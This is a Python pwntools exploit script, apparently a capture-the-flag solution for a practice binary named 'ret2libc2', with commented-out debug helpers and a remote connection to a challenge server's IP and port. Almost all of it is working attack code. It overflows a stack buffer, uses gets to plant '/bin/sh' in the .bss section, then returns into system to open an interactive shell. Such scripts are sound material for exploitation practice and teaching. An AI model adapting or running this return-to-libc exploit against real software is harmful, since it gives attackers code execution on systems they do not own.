# coding=utf-8
from pwn import *
'''
import time
context.terminal = ['tmux', 'split','-h']
context.log_level = 'debug'

def z(a=''):
    if debug:
        gdb.attach(p,a)
    if a == '':
  	    raw_input()

arch="i386"  #arch="amd64"

debug=1
if debug:
    p=process('./ret2libc2')
    e=ELF('./ret2libc2')
    #e=ELF('./ezshellcode')
    proc_base = p.libs()[p.cwd + p.argv[0].strip('.')]                   #获取本地程序加载基地址
    if arch=="i386":
        libc_base = p.libs()["/lib/i386-linux-gnu/libc-2.23.so"]            #获取本地libc加载基地址
    elif arch=="amd64":
        libc_base = p.libs()["/lib/x86_64-linux-gnu/libc-2.23.so"]


else:
    p=remote('129.211.58.26',10000)
    #p.sendline("zmbcen")
'''
p=process('./ret2libc2')
#gdb.attach(p)
e=ELF('./ret2libc2')
bss=0x0804a080
main_addr=0x08048648
gets_plt=e.plt['gets']
system_plt=e.plt['system']
#z("b *0x80486bf\nc")

payload1="a"*(0x64+0x4+0x8)+p32(gets_plt)+p32(main_addr)+p32(bss)
p.sendline(payload1)
p.sendline("/bin/sh\x00")

p.recvuntil("What do you think ?")
payload2="a"*(0x64+0x4)+p32(system_plt)+"aaaa"+p32(0x0804a080)
p.sendline(payload2)


p.interactive()
